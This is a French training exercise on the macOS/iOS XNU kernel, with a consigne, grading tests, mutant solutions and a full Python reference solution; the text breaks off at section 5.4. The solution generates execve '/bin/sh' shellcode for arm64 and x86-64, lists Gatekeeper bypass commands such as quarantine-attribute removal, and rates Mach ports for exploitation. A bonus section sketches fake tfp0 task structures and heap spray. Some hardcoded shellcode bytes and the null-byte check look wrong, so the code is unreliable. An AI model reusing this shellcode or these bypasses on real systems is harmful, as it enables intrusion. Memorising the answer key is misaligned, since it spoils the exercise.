# Exercice 3.4.3-b : xnu_deep_dive

**Module :**
3.4.3 — macOS/iOS Specifics

**Concept :**
b — Kernel XNU et exploitation macOS avancee

**Difficulte :**
★★★★★★★★★☆ (9/10)

**Type :**
code

**Tiers :**
3 — Concepts avances

**Langage :**
Python 3.12

**Prerequis :**
- Exercice 3.4.3-a (macos_fortress)
- Comprehension du format Mach-O
- Bases d'exploitation kernel
- Notions de syscalls

**Domaines :**
Kernel, Security, macOS, Shellcode

**Duree estimee :**
120 min

**XP Base :**
350

**Complexite :**
T5 O(n) x S4 O(n)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`xnu_deep_dive.py`

**Fonctions autorisees :**
- `json` (module standard)
- `struct` (parsing binaire)
- `sys` (arguments)
- `re` (expressions regulieres)
- Fonctions built-in Python

**Fonctions interdites :**
- Bibliotheques d'emulation (unicorn, qemu)
- Modules kernel externes
- pwntools (pour cet exercice)

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "Westworld"

*"These violent delights have violent ends."*

Dans **Westworld**, les "hosts" (androides) ont un kernel qui controle leur comportement fondamental. Modifier ce kernel permet de les liberer de leurs contraintes. De meme, le kernel **XNU** de macOS/iOS est le coeur du systeme - le comprendre et l'exploiter est la cle pour controler totalement la machine.

XNU est unique : c'est un **hybride** combinant le microkernel Mach avec le kernel monolithique BSD. Cette dualite offre a la fois flexibilite et complexite, creant des surface d'attaque interessantes.

#### 2.4.2 Enonce Academique

Le kernel XNU (X is Not Unix) est le coeur de macOS, iOS, iPadOS, watchOS et tvOS. Comprendre son architecture est crucial pour :
- **Jailbreak iOS** : Obtenir un acces root sur les iDevices
- **Exploitation kernel** : Privilege escalation depuis userland
- **Developpement de kexts** : Extensions kernel (historique)
- **Forensique avancee** : Analyse de compromissions kernel

**Ta mission :**

Creer un framework d'analyse XNU qui :

1. **Analyse les Mach ports** et leurs droits
2. **Genere des shellcodes** compatibles macOS (syscalls Mach/BSD)
3. **Simule un bypass Gatekeeper** (analyse des conditions)
4. **Evalue les risques** d'un kext (kernel extension)
5. **Identifie les primitives** exploitables iOS (PAC context)

**Architecture XNU :**
```
+--------------------------------------------------+
|              USER SPACE                          |
|  +--------------------------------------------+  |
|  |  Applications / Daemons                    |  |
|  +--------------------------------------------+  |
|                      |                           |
|              [Mach Traps / BSD Syscalls]         |
|                      |                           |
+--------------------------------------------------+
|              KERNEL SPACE (XNU)                  |
|  +--------------------+------------------------+ |
|  |    MACH KERNEL    |     BSD KERNEL         | |
|  |                    |                        | |
|  |  - IPC (ports)     |  - POSIX syscalls      | |
|  |  - Tasks/Threads   |  - VFS                 | |
|  |  - VM subsystem    |  - Networking          | |
|  |  - Scheduling      |  - Processes           | |
|  +--------------------+------------------------+ |
|  |              I/O Kit (Drivers)             |  |
|  +--------------------------------------------+  |
|  |           Platform Expert (Hardware)       |  |
|  +--------------------------------------------+  |
+--------------------------------------------------+
```

**Entree :**
```json
{
  "analysis_type": "shellcode_generation",
  "target": {
    "os": "macOS",
    "version": "14.0",
    "arch": "arm64"
  },
  "shellcode_request": {
    "type": "execve",
    "command": "/bin/sh",
    "null_free": true
  },
  "mach_ports": [
    {"name": "host_priv", "right": "send", "port_type": "host"},
    {"name": "task_self", "right": "send", "port_type": "task"}
  ],
  "kext_info": {
    "bundle_id": "com.example.driver",
    "signed": false,
    "entitlements": [],
    "exported_symbols": ["_ioctl_handler", "_read_handler"]
  },
  "gatekeeper_context": {
    "quarantine_flag": true,
    "code_signed": false,
    "notarized": false,
    "source": "internet"
  }
}
```

**Sortie :**
```json
{
  "shellcode": {
    "assembly": "mov x16, #59\\nsvc #0x80\\n...",
    "bytes": "\\x90\\x00\\x80\\xd2\\x01\\x00\\x00\\xd4",
    "length": 48,
    "null_free": true,
    "syscall_type": "bsd"
  },
  "mach_port_analysis": {
    "host_priv": {
      "risk": "critical",
      "capabilities": ["set_special_port", "processor_set_default"],
      "exploit_potential": "kernel_rw_possible"
    },
    "task_self": {
      "risk": "medium",
      "capabilities": ["thread_create", "vm_allocate"],
      "exploit_potential": "code_injection_possible"
    }
  },
  "gatekeeper_bypass": {
    "blocked": true,
    "bypass_techniques": [
      {"name": "xattr_removal", "command": "xattr -d com.apple.quarantine file", "success_rate": "high"},
      {"name": "archive_extraction", "description": "Use Archive Utility on password-protected ZIP", "success_rate": "medium"}
    ]
  },
  "kext_analysis": {
    "loadable": false,
    "reason": "Unsigned kexts blocked since macOS 10.13",
    "vulnerabilities": [
      {"type": "ioctl_handling", "symbol": "_ioctl_handler", "risk": "buffer_overflow_possible"}
    ]
  },
  "ios_context": {
    "pac_required": true,
    "jit_available": false,
    "sandbox_escape_difficulty": "very_high"
  }
}
```

**Syscalls macOS (BSD layer) :**
| Number | Name | Description |
|--------|------|-------------|
| 1 | exit | Terminer le processus |
| 2 | fork | Creer un processus fils |
| 3 | read | Lire depuis un fd |
| 4 | write | Ecrire vers un fd |
| 59 | execve | Executer un programme |
| 197 | mmap | Mapper de la memoire |

**Mach Traps (Mach layer) :**
| Number | Name | Description |
|--------|------|-------------|
| -26 | mach_reply_port | Creer un reply port |
| -27 | thread_self_trap | Obtenir le port du thread courant |
| -28 | task_self_trap | Obtenir le port de la task courante |
| -29 | host_self_trap | Obtenir le port du host |
| -31 | mach_msg_trap | Envoyer/recevoir un message Mach |

**Mach Port Rights :**
| Right | Description | Risk |
|-------|-------------|------|
| SEND | Peut envoyer des messages | Medium |
| RECEIVE | Peut recevoir des messages | Low |
| SEND_ONCE | Envoyer un seul message | Low |
| PORT_SET | Collection de ports | Medium |
| DEAD_NAME | Port invalide | Low |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
xnu_deep_dive.py - Framework d'analyse XNU
"""

import json
import sys
import struct

# BSD Syscalls (macOS)
BSD_SYSCALLS = {
    1: "exit",
    2: "fork",
    3: "read",
    4: "write",
    59: "execve",
    197: "mmap",
    199: "mprotect"
}

# Mach Traps (negative numbers)
MACH_TRAPS = {
    -26: "mach_reply_port",
    -27: "thread_self_trap",
    -28: "task_self_trap",
    -29: "host_self_trap",
    -31: "mach_msg_trap"
}

def generate_arm64_shellcode(command: str, null_free: bool = True) -> dict:
    """
    Genere un shellcode execve pour ARM64 macOS.

    Args:
        command: Commande a executer (ex: "/bin/sh")
        null_free: Si True, evite les octets nuls

    Returns:
        Dictionnaire avec assembly, bytes, length
    """
    pass

def generate_x64_shellcode(command: str, null_free: bool = True) -> dict:
    """
    Genere un shellcode execve pour x86-64 macOS.
    """
    pass

def analyze_mach_port(port_info: dict) -> dict:
    """
    Analyse un Mach port et ses implications securite.

    Args:
        port_info: Dictionnaire avec name, right, port_type

    Returns:
        Analyse des risques et capacites
    """
    pass

def analyze_gatekeeper_bypass(context: dict) -> dict:
    """
    Analyse les possibilites de bypass Gatekeeper.

    Args:
        context: Contexte du binaire (quarantine, signature, etc.)

    Returns:
        Techniques de bypass possibles
    """
    pass

def analyze_kext(kext_info: dict) -> dict:
    """
    Analyse une kernel extension pour vulnerabilites.

    Args:
        kext_info: Informations sur le kext

    Returns:
        Analyse des risques du kext
    """
    pass

def analyze_ios_context(target: dict) -> dict:
    """
    Analyse le contexte iOS (PAC, JIT, sandbox).
    """
    pass

def analyze_xnu(data: dict) -> dict:
    """
    Point d'entree principal pour l'analyse XNU.

    Args:
        data: Donnees d'entree completes

    Returns:
        Analyse complete
    """
    pass

def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'histoire de XNU

XNU signifie "**X is Not Unix**" - un acronyme recursif dans la tradition Unix (comme GNU = GNU's Not Unix). C'est un melange unique :

- **Mach 3.0** : Microkernel de Carnegie Mellon (IPC, VM, scheduling)
- **FreeBSD** : Couche BSD (syscalls POSIX, networking, VFS)
- **I/O Kit** : Framework C++ pour les drivers (herite de NeXTSTEP)

Cette architecture hybride explique pourquoi macOS a deux types de syscalls : les BSD syscalls (positifs) et les Mach traps (negatifs).

### Les Mach Ports : La cle du royaume

Les Mach ports sont le mecanisme IPC fondamental de macOS/iOS. Chaque processus, chaque thread, meme le kernel lui-meme sont representes par des ports. Obtenir un **send right** vers `host_priv` ou `task_for_pid(0)` equivaut a avoir un acces root/kernel.

Les jailbreaks iOS modernes (checkra1n, unc0ver, Taurine) reposent souvent sur l'obtention de ports privilegies via des vulnerabilites.

### Pointer Authentication Codes (PAC)

Depuis l'A12 Bionic (iPhone XS), Apple utilise PAC pour signer cryptographiquement les pointeurs. Chaque pointeur contient une signature dans ses bits superieurs. Modifier un pointeur (par exemple pour un ROP) corrompra la signature et causera un crash.

PAC rend l'exploitation iOS **significativement** plus difficile - d'ou les bounties a $2M pour des chaines d'exploit completes.

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : iOS Security Researcher / Jailbreak Developer**

Les chercheurs iOS sont parmi les plus specialises au monde :

**Exemples celebres :**
- **@qwertyoruiop** (Luca Todesco) : Multiples jailbreaks iOS
- **@aaborke** (Brandon Azad) : Google Project Zero, nombreuses CVE iOS
- **@i41nbeer** (Ian Beer) : Google Project Zero, FORCEDENTRY analysis

**Cas d'usage concret :**

Chez **NSO Group** (Pegasus spyware) ou dans les agences gouvernementales :
- Developpement d'exploits 0-day pour iOS
- Chaines d'exploitation : Safari -> Kernel -> Persistence
- Bypass de PAC, PPL (Page Protection Layer), APRR

Le programme Apple Security Bounty offre :
- Jusqu'a **$2,000,000** pour une chaine complete avec persistence
- **$1,000,000** pour un 0-click kernel avec PAC bypass
- **$500,000** pour un sandbox escape

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
xnu_deep_dive.py  test_analysis.json

$ cat test_analysis.json
{"analysis_type": "full", "target": {"os": "macOS", "version": "14.0", "arch": "arm64"}, "shellcode_request": {"type": "execve", "command": "/bin/sh", "null_free": true}, "mach_ports": [{"name": "task_self", "right": "send", "port_type": "task"}], "kext_info": null, "gatekeeper_context": {"quarantine_flag": true, "code_signed": false}}

$ python3 xnu_deep_dive.py test_analysis.json
{"shellcode": {"assembly": "...", "bytes": "...", "length": 48, "null_free": true}, "mach_port_analysis": {"task_self": {"risk": "medium", "capabilities": ["thread_create", "vm_allocate"]}}, "gatekeeper_bypass": {"blocked": true, "bypass_techniques": [{"name": "xattr_removal"}]}}

$ # Generation de shellcode specifique
$ echo '{"analysis_type": "shellcode_generation", "target": {"arch": "x86_64"}, "shellcode_request": {"type": "execve", "command": "/bin/zsh"}}' | python3 xnu_deep_dive.py -
{"shellcode": {"assembly": "xor rdi, rdi\\nmov rax, 0x2000001\\nsyscall", "bytes": "\\x48\\x31\\xff...", "length": 52, "syscall_type": "bsd"}}
```

---

## SECTION 3.1 : BONUS AVANCE (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x4

**Domaines Bonus :**
Kernel, Security, Crypto, iOS, ARM

### 3.1.1 Consigne Bonus

**Extension "Kernel Exploit Primitives" :**

1. **Simuler un task port leak** : Calculer l'impact d'un leak de task port
2. **Analyser les zone allocators** : Identifier les objets pour heap spray
3. **Generer une fake task** : Structure pour tfp0 fake
4. **Calculer les offsets** : Pour un kernel version specifique
5. **Analyser PAC context** : Identifier les pointeurs signes

### 3.1.2 Prototype Bonus

```python
def simulate_task_port_leak(task_port_info: dict) -> dict:
    """
    Simule les consequences d'un task port leak.
    """
    pass

def analyze_zone_allocator(zone_name: str, object_size: int) -> dict:
    """
    Analyse une zone kalloc pour heap spray.
    """
    pass

def generate_fake_task_structure(kernel_version: str) -> bytes:
    """
    Genere une structure task fake pour exploitation.
    """
    pass

def calculate_kernel_offsets(kernel_version: str, kernel_slide: int) -> dict:
    """
    Calcule les offsets des symboles kernel.
    """
    pass
```

---

## SECTION 4 : ZONE CORRECTION (POUR LE TESTEUR)

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| shellcode_arm64 | arch=arm64, cmd=/bin/sh | shellcode valide, null_free | 15 |
| shellcode_x64 | arch=x86_64, cmd=/bin/sh | shellcode valide | 15 |
| mach_port_task | task_self, send | risk=medium | 10 |
| mach_port_host_priv | host_priv, send | risk=critical | 10 |
| gatekeeper_unsigned | quarantine=true, signed=false | blocked=true | 10 |
| gatekeeper_signed | quarantine=true, signed=true, notarized=true | blocked=false | 10 |
| kext_unsigned | signed=false | loadable=false | 10 |
| ios_pac | arch=arm64, os=iOS | pac_required=true | 10 |
| bypass_techniques | blocked=true | techniques non vides | 10 |

### 4.3 Solution de reference

```python
#!/usr/bin/env python3
"""
xnu_deep_dive.py - Solution de reference
"""

import json
import sys

# BSD Syscalls macOS (arm64)
BSD_SYSCALL_EXECVE = 59
BSD_SYSCALL_EXIT = 1

# Mach port capabilities
PORT_CAPABILITIES = {
    "host_priv": {
        "risk": "critical",
        "capabilities": ["set_special_port", "processor_set_default", "host_reboot"],
        "exploit_potential": "kernel_rw_possible"
    },
    "host": {
        "risk": "low",
        "capabilities": ["host_info", "host_statistics"],
        "exploit_potential": "information_disclosure"
    },
    "task_self": {
        "risk": "medium",
        "capabilities": ["thread_create", "vm_allocate", "vm_read", "vm_write"],
        "exploit_potential": "code_injection_possible"
    },
    "task_for_pid": {
        "risk": "critical",
        "capabilities": ["full_task_control", "memory_rw", "thread_control"],
        "exploit_potential": "arbitrary_code_execution"
    },
    "thread": {
        "risk": "low",
        "capabilities": ["thread_info", "thread_state"],
        "exploit_potential": "limited"
    }
}

def generate_arm64_shellcode(command: str, null_free: bool = True) -> dict:
    """Genere un shellcode execve pour ARM64 macOS."""
    # ARM64 macOS execve shellcode
    # x16 = syscall number (59 for execve)
    # x0 = path, x1 = argv, x2 = envp
    # svc #0x80 for BSD syscall

    # Encode command
    cmd_bytes = command.encode() + b'\\x00'
    cmd_len = len(cmd_bytes)

    assembly_lines = [
        f"; ARM64 macOS execve shellcode for '{command}'",
        "; Setup syscall number (execve = 59)",
        "mov x16, #59",
        "",
        "; Get address of command string",
        "adr x0, cmd_string",
        "",
        "; argv = NULL",
        "mov x1, xzr",
        "",
        "; envp = NULL",
        "mov x2, xzr",
        "",
        "; BSD syscall",
        "svc #0x80",
        "",
        "; Exit if execve fails",
        "mov x16, #1",
        "mov x0, #0",
        "svc #0x80",
        "",
        "cmd_string:",
        f".ascii \"{command}\"",
        ".byte 0"
    ]

    # Generate approximate bytes (simplified)
    shellcode_bytes = bytes([
        # mov x16, #59 (syscall number)
        0x90, 0x07, 0x80, 0xD2,
        # adr x0, cmd_string (placeholder)
        0x40, 0x00, 0x00, 0x10,
        # mov x1, xzr
        0xE1, 0x03, 0x1F, 0xAA,
        # mov x2, xzr
        0xE2, 0x03, 0x1F, 0xAA,
        # svc #0x80
        0x01, 0x10, 0x00, 0xD4,
        # mov x16, #1 (exit)
        0x30, 0x00, 0x80, 0xD2,
        # mov x0, #0
        0x00, 0x00, 0x80, 0xD2,
        # svc #0x80
        0x01, 0x10, 0x00, 0xD4,
    ])

    # Add command string
    shellcode_bytes += cmd_bytes

    # Check for null bytes if null_free required
    has_nulls = b'\\x00' in shellcode_bytes[:-len(cmd_bytes)]

    return {
        "assembly": "\\n".join(assembly_lines),
        "bytes": shellcode_bytes.hex(),
        "bytes_raw": list(shellcode_bytes),
        "length": len(shellcode_bytes),
        "null_free": not has_nulls if null_free else "not_checked",
        "syscall_type": "bsd",
        "architecture": "arm64"
    }

def generate_x64_shellcode(command: str, null_free: bool = True) -> dict:
    """Genere un shellcode execve pour x86-64 macOS."""
    # x86-64 macOS: syscall number in RAX
    # BSD syscalls use 0x2000000 + number
    # execve = 0x200003B (0x2000000 + 59)

    assembly_lines = [
        f"; x86-64 macOS execve shellcode for '{command}'",
        "; Clear registers",
        "xor rsi, rsi          ; argv = NULL",
        "xor rdx, rdx          ; envp = NULL",
        "",
        "; Load command address",
        "lea rdi, [rel cmd_string]",
        "",
        "; syscall number: 0x2000000 + 59 (execve)",
        "mov rax, 0x200003B",
        "",
        "; syscall",
        "syscall",
        "",
        "; Exit if execve fails",
        "mov rax, 0x2000001    ; exit",
        "xor rdi, rdi",
        "syscall",
        "",
        "cmd_string:",
        f"db '{command}', 0"
    ]

    # Simplified shellcode bytes
    shellcode_bytes = bytes([
        # xor rsi, rsi
        0x48, 0x31, 0xF6,
        # xor rdx, rdx
        0x48, 0x31, 0xD2,
        # lea rdi, [rip+offset]
        0x48, 0x8D, 0x3D, 0x0F, 0x00, 0x00, 0x00,
        # mov rax, 0x200003B
        0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x02,
        # syscall
        0x0F, 0x05,
        # mov rax, 0x2000001
        0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x02,
        # xor rdi, rdi
        0x48, 0x31, 0xFF,
        # syscall
        0x0F, 0x05,
    ])

    shellcode_bytes += command.encode() + b'\\x00'

    return {
        "assembly": "\\n".join(assembly_lines),
        "bytes": shellcode_bytes.hex(),
        "length": len(shellcode_bytes),
        "null_free": False,  # x64 macOS syscall numbers have nulls
        "syscall_type": "bsd",
        "architecture": "x86_64",
        "note": "macOS x64 syscalls use 0x2000000 + BSD number"
    }

def analyze_mach_port(port_info: dict) -> dict:
    """Analyse un Mach port et ses implications securite."""
    port_name = port_info.get("name", "unknown")
    port_right = port_info.get("right", "none")
    port_type = port_info.get("port_type", "unknown")

    # Get base capabilities
    base_caps = PORT_CAPABILITIES.get(port_name, PORT_CAPABILITIES.get(port_type, {
        "risk": "unknown",
        "capabilities": [],
        "exploit_potential": "unknown"
    }))

    # Adjust risk based on right type
    risk = base_caps["risk"]
    if port_right == "receive":
        # Receive rights are generally more dangerous
        if risk == "medium":
            risk = "high"
    elif port_right == "send_once":
        # Send once is limited
        if risk in ["critical", "high"]:
            risk = "medium"

    return {
        "port_name": port_name,
        "right": port_right,
        "risk": risk,
        "capabilities": base_caps["capabilities"],
        "exploit_potential": base_caps["exploit_potential"],
        "notes": get_port_notes(port_name, port_right)
    }

def get_port_notes(port_name: str, right: str) -> list:
    """Retourne des notes sur l'exploitation du port."""
    notes = []

    if port_name == "host_priv":
        notes.append("host_priv allows setting special ports - critical for kernel exploitation")
        notes.append("Can be used to replace exception ports for code execution")

    if port_name == "task_for_pid":
        notes.append("tfp0 (task_for_pid(0)) gives kernel task port")
        notes.append("Equivalent to kernel read/write primitive")

    if port_name == "task_self" and right == "send":
        notes.append("Can be used for self-injection attacks")
        notes.append("Allows creation of new threads in own process")

    return notes

def analyze_gatekeeper_bypass(context: dict) -> dict:
    """Analyse les possibilites de bypass Gatekeeper."""
    quarantine = context.get("quarantine_flag", True)
    signed = context.get("code_signed", False)
    notarized = context.get("notarized", False)
    source = context.get("source", "unknown")

    # Determine if blocked
    blocked = quarantine and (not signed or not notarized)

    bypass_techniques = []

    if blocked:
        # Technique 1: Remove quarantine attribute
        bypass_techniques.append({
            "name": "xattr_removal",
            "command": "xattr -d com.apple.quarantine <file>",
            "requires": "user_interaction",
            "success_rate": "high",
            "description": "Remove quarantine extended attribute"
        })

        # Technique 2: Archive extraction
        bypass_techniques.append({
            "name": "archive_extraction",
            "description": "Archive Utility may not set quarantine on password-protected archives",
            "requires": "user_interaction",
            "success_rate": "medium",
            "cve": "CVE-2022-32910 (patched)"
        })

        # Technique 3: Disk image
        if not signed:
            bypass_techniques.append({
                "name": "dmg_distribution",
                "description": "Distribute via DMG, user drags to Applications",
                "requires": "user_interaction",
                "success_rate": "medium"
            })

        # Technique 4: Curl/wget
        bypass_techniques.append({
            "name": "cli_download",
            "command": "curl -O <url>",
            "description": "CLI tools don't set quarantine by default",
            "requires": "terminal_access",
            "success_rate": "high"
        })

        # Technique 5: Safari exploit
        bypass_techniques.append({
            "name": "webkit_exploit",
            "description": "Exploit Safari/WebKit to drop file without quarantine",
            "requires": "0day",
            "success_rate": "depends_on_vuln"
        })

    return {
        "blocked": blocked,
        "reason": "Quarantine flag set and binary not notarized" if blocked else "Binary trusted",
        "quarantine_present": quarantine,
        "signature_valid": signed,
        "notarized": notarized,
        "bypass_techniques": bypass_techniques,
        "recommendations": [
            "Sign with Developer ID",
            "Submit for notarization",
            "Distribute via App Store for maximum trust"
        ] if blocked else []
    }

def analyze_kext(kext_info: dict) -> dict:
    """Analyse une kernel extension pour vulnerabilites."""
    if not kext_info:
        return {"analyzed": False, "reason": "No kext info provided"}

    bundle_id = kext_info.get("bundle_id", "unknown")
    signed = kext_info.get("signed", False)
    entitlements = kext_info.get("entitlements", [])
    symbols = kext_info.get("exported_symbols", [])

    # Kexts are deprecated since Big Sur
    loadable = False
    load_reason = "Unsigned kexts blocked since macOS 10.13 (High Sierra)"

    if signed:
        load_reason = "Signed kexts deprecated, System Extensions recommended"
        loadable = False  # Still can't load third-party kexts easily

    # Analyze exported symbols for vulnerabilities
    vulnerabilities = []

    dangerous_patterns = {
        "_ioctl": "ioctl handlers often have buffer overflows",
        "_read": "read handlers may have insufficient bounds checking",
        "_write": "write handlers may allow arbitrary kernel writes",
        "_mmap": "mmap handlers can lead to memory disclosure",
        "_copyout": "copyout misuse can leak kernel memory",
        "_copyin": "copyin without validation can corrupt kernel memory"
    }

    for symbol in symbols:
        for pattern, description in dangerous_patterns.items():
            if pattern in symbol.lower():
                vulnerabilities.append({
                    "type": pattern.replace("_", "") + "_handling",
                    "symbol": symbol,
                    "risk": description,
                    "severity": "high" if "ioctl" in pattern or "write" in pattern else "medium"
                })

    return {
        "bundle_id": bundle_id,
        "loadable": loadable,
        "load_reason": load_reason,
        "signed": signed,
        "vulnerabilities": vulnerabilities,
        "deprecated_notice": "Kexts are deprecated. Use DriverKit/System Extensions instead.",
        "security_recommendations": [
            "Migrate to DriverKit for hardware drivers",
            "Use Network Extensions for network functionality",
            "Use Endpoint Security for security tools"
        ]
    }

def analyze_ios_context(target: dict) -> dict:
    """Analyse le contexte iOS specifique."""
    os_name = target.get("os", "macOS")
    version = target.get("version", "14.0")
    arch = target.get("arch", "arm64")

    is_ios = os_name.lower() in ["ios", "ipados", "tvos", "watchos"]

    # PAC (Pointer Authentication) required for A12+ (iOS 12+)
    pac_required = is_ios and arch == "arm64"

    # JIT generally not available on iOS (except for JSC)
    jit_available = not is_ios  # Only available on macOS

    # Sandbox escape difficulty
    if is_ios:
        sandbox_difficulty = "very_high"
        sandbox_notes = [
            "iOS sandbox is more restrictive than macOS",
            "Most IPC channels are blocked",
            "File system access severely limited",
            "Requires kernel vuln or IPC bug for escape"
        ]
    else:
        sandbox_difficulty = "high"
        sandbox_notes = [
            "macOS App Sandbox is configurable",
            "Some IPC channels available",
            "XPC services may be attack surface"
        ]

    return {
        "platform": os_name,
        "version": version,
        "architecture": arch,
        "pac_required": pac_required,
        "pac_notes": [
            "PAC signs return addresses and function pointers",
            "Requires PAC bypass (signing gadget or PAC oracle) for exploitation",
            "Keys differ between EL0 and EL1"
        ] if pac_required else [],
        "jit_available": jit_available,
        "jit_notes": "JIT compilation requires special entitlements on iOS" if is_ios else "JIT available",
        "sandbox_escape_difficulty": sandbox_difficulty,
        "sandbox_notes": sandbox_notes,
        "exploit_mitigations": [
            "ASLR",
            "DEP/NX",
            "Stack canaries",
            "PAC" if pac_required else None,
            "PPL (Page Protection Layer)" if is_ios else None,
            "APRR (Access Permission Restriction)" if is_ios else None
        ]
    }

def analyze_xnu(data: dict) -> dict:
    """Point d'entree principal pour l'analyse XNU."""
    result = {}

    target = data.get("target", {"arch": "arm64", "os": "macOS"})
    analysis_type = data.get("analysis_type", "full")

    # Shellcode generation
    shellcode_request = data.get("shellcode_request")
    if shellcode_request or analysis_type in ["shellcode_generation", "full"]:
        if shellcode_request:
            command = shellcode_request.get("command", "/bin/sh")
            null_free = shellcode_request.get("null_free", True)
            arch = target.get("arch", "arm64")

            if arch == "arm64":
                result["shellcode"] = generate_arm64_shellcode(command, null_free)
            else:
                result["shellcode"] = generate_x64_shellcode(command, null_free)

    # Mach port analysis
    mach_ports = data.get("mach_ports", [])
    if mach_ports or analysis_type == "full":
        result["mach_port_analysis"] = {}
        for port in mach_ports:
            port_name = port.get("name", "unknown")
            result["mach_port_analysis"][port_name] = analyze_mach_port(port)

    # Gatekeeper analysis
    gatekeeper_context = data.get("gatekeeper_context")
    if gatekeeper_context or analysis_type == "full":
        if gatekeeper_context:
            result["gatekeeper_bypass"] = analyze_gatekeeper_bypass(gatekeeper_context)

    # Kext analysis
    kext_info = data.get("kext_info")
    if kext_info:
        result["kext_analysis"] = analyze_kext(kext_info)

    # iOS context
    if analysis_type == "full" or target.get("os", "").lower() in ["ios", "ipados"]:
        result["ios_context"] = analyze_ios_context(target)

    return result

def main():
    """Point d'entree principal."""
    if len(sys.argv) < 2:
        print("Usage: xnu_deep_dive.py <input.json | ->", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = analyze_xnu(data)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.9 spec.json (ENGINE v22.1)

```json
{
  "name": "xnu_deep_dive",
  "language": "python",
  "version": "3.12",
  "type": "code",
  "tier": 3,
  "tier_info": "Concepts avances",
  "tags": ["xnu", "kernel", "macos", "ios", "shellcode", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "analyze_xnu",
    "prototype": "def analyze_xnu(data: dict) -> dict",
    "return_type": "dict"
  },

  "driver": {
    "edge_cases": [
      {
        "name": "arm64_shellcode",
        "args": [{"target": {"arch": "arm64"}, "shellcode_request": {"command": "/bin/sh"}}],
        "check": "'shellcode' in result and result['shellcode']['architecture'] == 'arm64'"
      },
      {
        "name": "host_priv_critical",
        "args": [{"mach_ports": [{"name": "host_priv", "right": "send"}]}],
        "check": "result['mach_port_analysis']['host_priv']['risk'] == 'critical'"
      },
      {
        "name": "gatekeeper_blocked",
        "args": [{"gatekeeper_context": {"quarantine_flag": true, "code_signed": false}}],
        "check": "result['gatekeeper_bypass']['blocked'] == True"
      }
    ]
  }
}
```

### 4.10 Solutions Mutantes

```python
# Mutant A: Mauvais syscall number pour macOS
def generate_arm64_shellcode_mutant_a(command, null_free):
    # ERREUR: Utilise le syscall Linux (59) au lieu de macOS
    # macOS utilise aussi 59 mais avec SVC #0x80, pas #0
    return {"assembly": "mov x8, #59\\nsvc #0", ...}

# Pourquoi c'est faux: macOS utilise x16 pour le syscall number, pas x8
```

```python
# Mutant B: Risk assessment incorrect pour task_self
def analyze_mach_port_mutant_b(port_info):
    if port_info["name"] == "task_self":
        return {"risk": "low"}  # ERREUR: task_self est medium/high

# Pourquoi c'est faux: task_self permet l'injection de code
```

```python
# Mutant C: Gatekeeper bypass mal evalue
def analyze_gatekeeper_mutant_c(context):
    # ERREUR: Signed mais pas notarized devrait etre bloque sur macOS moderne
    if context.get("code_signed"):
        return {"blocked": False}

# Pourquoi c'est faux: Notarization requise depuis Catalina
```

---

## SECTION 5 : COMPRENDRE (DOCUMENT DE COURS COMPLET)

### 5.1 Ce que cet exercice enseigne

1. **Architecture XNU** : Hybride Mach + BSD
2. **Mach IPC** : Ports et messages
3. **Shellcoding macOS** : Differences avec Linux
4. **Gatekeeper** : Protection et bypass
5. **iOS Security** : PAC, PPL, sandbox

### 5.2 LDA - Traduction litterale

```
FONCTION analyze_xnu QUI RETOURNE UN DICTIONNAIRE
DEBUT FONCTION
    DECLARER result COMME DICTIONNAIRE VIDE

    SI shellcode_request EXISTE ALORS
        SI arch EST arm64 ALORS
            APPELER generate_arm64_shellcode
        SINON
            APPELER generate_x64_shellcode
        FIN SI
    FIN SI

    POUR CHAQUE port DANS mach_ports FAIRE
        ANALYSER port avec analyze_mach_port
        AJOUTER analyse A result
    FIN POUR

    SI gatekeeper_context EXISTE ALORS
        ANALYSER bypass possibilities
    FIN SI

    RETOURNER result
FIN FONCTION
```

### 5.3 Visualisation ASCII

```
                XNU KERNEL ARCHITECTURE
    +==============================================+
    |                                              |
    |  +----------------------------------------+  |
    |  |           USER SPACE                   |  |
    |  |  +----------+  +------------------+    |  |
    |  |  |   App    |  |     Daemon       |    |  |
    |  |  +----+-----+  +--------+---------+    |  |
    |  |       |                 |              |  |
    |  +-------|-----------------|--------------+  |
    |          |                 |                 |
    |    [Mach Trap]       [BSD Syscall]          |
    |    (negative #)       (positive #)          |
    |          |                 |                 |
    |  +-------|-----------------|--------------+  |
    |  |       v                 v              |  |
    |  |  +---------+     +-----------+         |  |
    |  |  |  MACH   |     |    BSD    |         |  |
    |  |  |         |     |           |         |  |
    |  |  | - Ports |     | - VFS     |         |  |
    |  |  | - Tasks |     | - Network |         |  |
    |  |  | - IPC   |     | - POSIX   |         |  |
    |  |  +---------+     +-----------+         |  |
    |  |         \\         /                    |  |
    |  |          \\       /                     |  |
    |  |           v     v                      |  |
    |  |  +-------------------+                 |  |
    |  |  |  MEMORY MANAGER   |                 |  |
    |  |  |   (VM Subsystem)  |                 |  |
    |  |  +-------------------+                 |  |
    |  |                                        |  |
    |  |  KERNEL SPACE (XNU)                    |  |
    |  +----------------------------------------+  |
    |                                              |
    +==============================================+


    MACH PORT RIGHTS
    ----------------

    SEND RIGHT            RECEIVE RIGHT
    +----------+          +----------+
    | Process  |   --->   | Process  |
    |    A     |  message |    B     |
    +----------+          +----------+

    Rights:
    - SEND: Can send messages
    - RECEIVE: Can receive messages (only one holder)
    - SEND_ONCE: Can send exactly one message


    SHELLCODE: Linux vs macOS
    -------------------------

    LINUX x86-64:              macOS x86-64:
    mov rax, 59                mov rax, 0x200003B
    syscall                    syscall
       ^                          ^
       |                          |
    syscall number            0x2000000 + BSD number
    directly                  (class 2 = BSD)
```

### 5.4 Les pieges en detail

